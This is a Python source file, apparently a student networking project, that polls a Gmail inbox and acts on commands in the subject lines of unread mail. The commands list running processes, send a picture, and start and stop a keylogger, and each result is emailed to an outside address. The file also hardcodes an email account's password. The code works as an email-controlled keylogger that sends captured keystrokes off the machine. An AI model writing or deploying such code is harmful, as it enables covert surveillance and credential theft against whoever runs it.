import ReceiveEmail
import SendEmail
import ListProcesses
import keylogger
from time import time, sleep

client_address = "client1.computernetwork@gmail.com"

client_pass="computernetwork" #unsecure

# guess_address = "lmtri.fit.hcmus@gmail.com"
guess_address = "letrong2307@gmail.com"
thread = None
def Handling(subject):
    global thread
    if subject == 'List Processes':
        content = ListProcesses.ListProcesses()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == "demo send picture":
        content = "test.jpg"
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'image')
    elif subject == "Start Key Logging":
        thread = keylogger.StartLogging()
        content = "Key logging has been launched"
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == "End Key Logging":
        content =   keylogger.EndLogging(thread)
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
      

def main():
    while True:
        # Nhận danh sách title của các thư "CHƯA ĐỌC"
        list = ReceiveEmail.ReceiveEmail(client_address,client_pass)
        if len(list):
            for i in list:
                #Xử lý các title tương ứng
                Handling(i)
        sleep(5)
        # else:
        #     print("Không có thư nào chưa đọc")
        # break
        # Handling("demo send picture")
        # break

#======================================================

main()